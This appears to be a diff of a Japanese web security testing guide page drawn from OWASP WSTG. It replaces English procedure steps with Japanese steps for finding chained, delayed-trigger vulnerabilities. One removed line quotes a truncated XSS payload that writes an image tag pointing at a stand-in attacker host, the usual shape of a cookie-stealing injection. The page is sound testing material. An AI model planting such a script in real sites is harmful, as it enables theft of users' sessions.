@@ -21,12 +21,10 @@ WSTG の Test Objectives:
 
 ## 手順
 
-1. **Black-Box Testing**
-2. **File Upload Example** — Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file
-3. **XSS Example on a Bulletin Board** — Introduce JavaScript code as the value for the vulnerable field, for instance <script>document.write('<img src="http://attackers.site/cv.jpg …
-4. **SQL Injection Example** — Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability
-5. **Misconfigured Server** — Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site
-6. **Gray-Box Testing** — Gray-box or white-box testing techniques will be the same as previously discussed.
+1. 単体では無害でも、保存→別処理で発火する連鎖（例: 保存 XSS が管理バッチで実行）を探す
+2. 入力が時間差・別コンポーネント経由で悪用される経路を業務フローから推定
+3. 複数の弱点（格納＋後段の信頼）を組み合わせて成立するシナリオを検証
+4. 単発テストで見落とす連鎖を finding にシナリオとして整理
 
 ## 使用ツール
 
